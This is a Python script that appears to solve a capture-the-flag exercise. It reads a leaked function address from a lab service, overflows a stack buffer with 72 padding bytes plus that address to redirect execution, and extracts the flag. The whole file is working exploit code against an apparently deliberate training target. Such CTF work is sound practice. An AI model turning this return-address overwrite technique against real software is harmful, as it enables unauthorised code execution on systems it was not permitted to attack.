#!/usr/bin/env python3
import re
import socket
import struct
import sys

FLAG_RE = re.compile(rb"flag\{[^}]+\}")


def recv_until(sock, marker):
    data = b""
    while marker not in data:
        chunk = sock.recv(1)
        if not chunk:
            break
        data += chunk
    return data


def solve(host="127.0.0.1", port=8081):
    with socket.create_connection((host, port), timeout=5) as sock:
        banner = recv_until(sock, b"name:\n")
        match = re.search(rb"gift: (0x[0-9a-fA-F]+)", banner)
        if not match:
            return None
        win = int(match.group(1), 16)
        payload = b"A" * 72 + struct.pack("<Q", win) + b"\n"
        sock.sendall(payload)
        response = b""
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            response += chunk
        flag = FLAG_RE.search(response)
        return flag.group(0).decode() if flag else None


if __name__ == "__main__":
    target_host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    target_port = int(sys.argv[2]) if len(sys.argv) > 2 else 8081
    recovered = solve(target_host, target_port)
    if not recovered:
        print("flag not found", file=sys.stderr)
        sys.exit(1)
    print(recovered)
